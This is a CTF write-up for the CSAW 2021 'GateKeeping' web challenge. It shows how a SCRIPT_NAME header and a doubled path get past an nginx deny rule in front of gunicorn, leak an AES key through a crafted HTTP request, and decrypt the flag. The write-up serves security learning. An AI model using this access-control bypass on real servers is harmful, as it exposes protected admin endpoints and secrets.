---
title: GateKeeping - CSAW '21 Qualifier
date: 2021-09-14
author: Sayooj B Kumar
author_url: https://twitter.com/_1nt3rc3pt0r_
categories:
 - Web Exploitation
tags:
 - Nginx
 - CSAW Quals
---

**tl;dr**

+ Bypass nginx's DENY ALL using `SCRIPT_NAME`
+ Calculate key_id uploading `flag.txt.enc`
+ Leak the key and decrypt `flag.txt.enc`

<!--more-->

**Challenge points**: 395

**No of solves**: 133

**Solved by**:[1nt3rc3pt0r](https://twitter.com/_1nt3rc3pt0r_), [Az3z3l](https://twitter.com/Az3z3l)

## Challenge Description

My previous flag file got encrypted by some dumb ransomware. They didn't even tell me how to pay them, so I'm totally out of luck. All I have is the site that is supposed to decrypt my files (but obviously that doesn't work either).

**Source Code:** [here](source-code.zip)


## Solution

### Bypassing Nginx

`SCRIPT_NAME` is a header that is sent by the proxy to the backend.`SCRIPT_NAME` is used to set the request url's root path so that the application knows its virtual “location”. This may be an empty string , if the application corresponds to the “root” of the server.


```
GET /asf/admin/admin/key HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
SCRIPT_NAME: /admin
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

In this case we are requesting `/asf/admin/admin/key` while SCRIPT_NAME is set to `/admin` which means forwarded request to backend will be `/admin/key`.

### key-id

```javascript
let decrypt = function() {
  const file = this.files[0];

  const reader = new FileReader();
  reader.onload = async function(evt) {
    let data = new Uint8Array(evt.target.result);

    let key_id = data.slice(0,16);
    key_id = buf2hex(key_id);

    data = data.slice(16);

    document.getElementById('result').innerHTML = '';
    let error = (e)=>{
      document.getElementById('result').innerHTML = `
      <div class="notification is-danger">
        ${e}
      </div>
      `;
    }

    try {
      let res = await fetch('/decrypt', {
        method:'POST',
        headers: {
          key_id
        },
        body: data
      });
      if (res.status === 200) {
        let dec_data = await res.blob();
        let a = document.createElement('a');
        a.setAttribute('href', URL.createObjectURL(dec_data));
        a.setAttribute('download', file.name.split('.').slice(0,-1).join('.'));
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      } else if (res.status === 403) {
        error(`You must pay the ransom before you can decrypt your file!`);
      } else {
        throw "bad";
      }
    } catch(e) {
      error(`There was an error decrypting your file, please try again later!`);
    }
  }
  reader.readAsArrayBuffer(file);
}
```

As you can see that `key_id` is calculated and updated to the backend using javascript, which means we can upload any file and acquire the key from client-side(index.html).

As we have to decrypt`flag.txt.enc`we have to calculate`key_id`corresponding to`flag.txt.enc`this could be done by uploading`flag.txt.enc`and debugging javascript.The calculated`key_id`is `05d1dc92ce82cc09d9d7ff1ac9d5611d`


### Leaking the Key and decrypting flag

#### Request

```
GET /asf/admin/admin/key HTTP/1.1
Host: web.chal.csaw.io:5004
key_id: 05d1dc92ce82cc09d9d7ff1ac9d5611d
SCRIPT_NAME: /admin
```

#### Response

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 11 Sep 2021 11:11:10 GMT
Content-Type: application/json
Content-Length: 75
Connection: close

{"key":"b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3"}
```

#### Decrypting the flag

```python
@app.route('/decrypt', methods=['POST'])
def decrypt():
    key = binascii.unhexlify("b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3")#key
    data = request.get_data()
    iv = data[:AES.block_size]

    data = data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CFB, iv)

    return cipher.decrypt(data)
```


## Flag

flag{gunicorn_probably_should_not_do_that}
